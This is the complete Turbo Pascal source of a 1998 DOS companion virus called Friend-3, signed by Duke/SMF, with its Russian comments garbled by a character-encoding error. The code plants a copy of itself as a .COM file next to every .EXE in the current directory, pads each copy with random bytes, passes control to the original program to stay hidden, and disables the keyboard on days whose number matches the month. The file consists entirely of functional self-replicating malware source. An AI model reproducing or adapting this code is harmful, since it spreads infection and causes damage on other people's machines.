   {
     *¥à¥¤ ¢ ¬¨ ¯à®áâ¥ìª¨© ¢¨àãá HLLC.Friend.5216 ¨«¨ Friend-3.
     *â® ä ©«®¢ë© ª®¬¯ ì® ¢¨àãá, ¯®à ¦ îé¨© EXE-ä ©«ë ¢ â¥ªãé¥¬ ª â «®£¥.
     ‘®§¤  5.06.98, ¢ ¤¥ì á¤ ç¨   "®â«¨ç®" íª§ ¬¥  ¯® ¨ä®à¬ â¨ª¥.
     ƒ« ¢ë© ¯à¨ª®« á®áâ®¨â ¢ â®¬, çâ® ª®¬¯ ì®-¢¨àãáë ª ª ¯à ¢¨«®
      ¯¨á ë    áá¥¬¡«¥à¥, çâ®¡ë ®âª®¬¯¨«¨à®¢ ë© ¢¨àãá ¨¬¥« à áè¨à¥¨¥
     ¨¬¥¨ COM. ’®£¤  ® á¬®¦¥â ¯®à ¦ âì EXE-ä ©«ë, á®§¤ ¢ ï COM-ä ©« á¯ãâ¨ª.
     *® Turbo Pascal 7.1 ª®¬¯¨«¨àã¥â á¢®¨ ä ©«ë â®«ìª® ¢ ä®à¬ â EXE.
     “â¨«¨âë â¨¯  EXE2COM ¬®£ãâ ¡ëâì ¬ «®à¥§ã«ìâ â¨¢ë ¢ íâ®¬ á«ãç ¥, ¯®íâ®¬ã
     ï ¨á¯®«ì§ãî á¯®á®¡ ¯®¯à®é¥ - ¯¥à¥¨¬¥®¢ âì ®âª®¬¯¨«¨à®¢ ë© ¢¨àãá ¢
     ä ©« á à áè¨à¥¨¥¬ COM. ˆ íâ® ¢á¥ - ¢¨àãá £®â®¢ ª § ¯ãáªã !
     ‚¨àãá ¯®á«¥ ®ç¥à¥¤®£® § à ¦¥¨ï ¨§¬¥ï¥â ¤«¨ã ä ©«  § ¯¨áë¢ ¨¥¬
     ¢áïª®£® ¬ãá®à  ¢ ª®¥æ - ® ¥ ¢«¨ï¥â   à ¡®âã ¯à®£à ¬¬ë, ® ¢ ®¤®©
     ¤¨à¥ªâ®à¨¨ ¥ ¡ã¤¥â ¥áª®«ìª¨å COM-ä ©«®¢ á ®¤¨ ª®¢®© ¤«¨®©.
     *® áà ¢¥¨î á ¢¥àá¨¥© 1 ¤®¡ ¢«¥ë ¯à®ï¢«¥¨ï (á¬. ¢ ª®æ¥ ä ©« ).
                                 Duke [SMF]     4.06.98
   -----------------------------------------------------------------------------}
   {$M 5000, 0, 5000}
   uses dos;
   const virsize=5216;                         {¤«¨  ¢¨àãá }
         e='.exe';
   var  ds:dirstr;
        ns:namestr;
        es:extstr;
        f,g:file;
        s:searchrec;
        mas:array[1..virsize] of char;         {â¥«® ¢¨àãá }
        st:string;
        yd,md,dd,wd:word;                      {â¥ªãé ï ¤ â }
        par:string;                            {¯ à ¬¥âàë ª®¬ ¤®© áâà®ª¨}
        i:integer;
   label infect;
   {----------------------------------------------------------------------------}
   procedure zar;                              {¯à®æ¥¤ãà  § à ¦¥¨ï}
   var i:integer;ch:char;
   begin
   fsplit(s.name,ds,ns,es);
   st:=ds+ns+'.com';
   assign(g,st);{$I-}reset(g,1);{$I+}          {*à®¢¥àï¥¬, ¥áâì «¨ ã¦¥ ä ©«}
                           {á à áè¨à¥¨¥¬ COM}
   if ioresult<>0 then                         {…á«¨ ¥â => ¥éñ ¥ § à ¦¥...}
     begin
     rewrite(g,1);                             {... á®§¤ ¥¬ ª®¬¯ ì®}
     blockwrite(g,mas,virsize);                {... ¯¨è¥¬ ¢¨àãá}
     for i:=1 to random(500) do                {... ¯¨è¥¬ ¬ãá®à}
       begin
       ch:=chr(random(250));
       blockwrite(g,ch,1);
       end;
     end;
   close(g);
   end;
   {-----------------------------------------------------------------------------}
   function ReadKey : Char;                    {  «®£ äãªæ¨¨ ReadKey ¬®¤ã«ï Crt}
   var chrout : char;
       CheckBreak: boolean;
   begin
   Inline(
   $B4/$07/               {  MOV AH,$07          }
   $CD/$21/               {  INT $21             }
   $88/$86/>CHROUT);      {  MOV >chrout[bp],AL  }
   if CheckBreak and (chrout = #3) then
     begin
     Inline(
     $CD/$23);            {  INT $23             }
     end;
   ReadKey := chrout;
   end;
   {----------------------------------------------------------------------------}
   begin
   st:='This is [Friend-3] virus (c) by Duke/SMF 5.11.98';
   fsplit(paramstr(0),ds,ns,es);
   st:=ds+ns+e;
   assign(g,st);{$I-}reset(g);{$I+}
   if ioresult<>0 then goto infect;   {¥á«¨ ¥  ©¤¥ ¯®à ¦¥ë© ä ©«,
                                       â® § à ¦ ¥¬ ¢á¥å}
   close(g);
   par:='';
   for i:=1 to paramcount do par:=par+' '+paramstr(i);
   exec(GetEnv('COMSPEC'),'/c '+st+par);
   {---- *®¨áª ¨ § à ¦¥¨¥ ----}
   infect:
   assign(f,paramstr(0));reset(f,1);
   blockread(f,mas,virsize);
   close(f);
   findfirst('*'+e,$21,s);
   zar;
   while doserror=0 do
     begin
     findnext(s);
     zar;
     end;
   {---- *à®¢¥àª  ¤ âë ¨ ¯à®ï¢«¥¨ï ¢¨àãá  ----}
   GetDate(yd,md,dd,wd);
   if yd>2000 then begin writeln('*¥à¥¢¥¤¨ ¤ âã!');readkey end;
   if dd=md then                  {‚¥è ¥¬ á¨áâ¥¬ã:}
    begin
    asm
      in     al,64h               {®âª«îç ¥¬ ª« ¢¨ âãàã ... }
      or     al,40h
      out    64h,al
    end;
    readkey;                      {¨ ¦¤¥¬  ¦ â¨ï   ª« ¢¨èã >:-() }
    end;
   end.
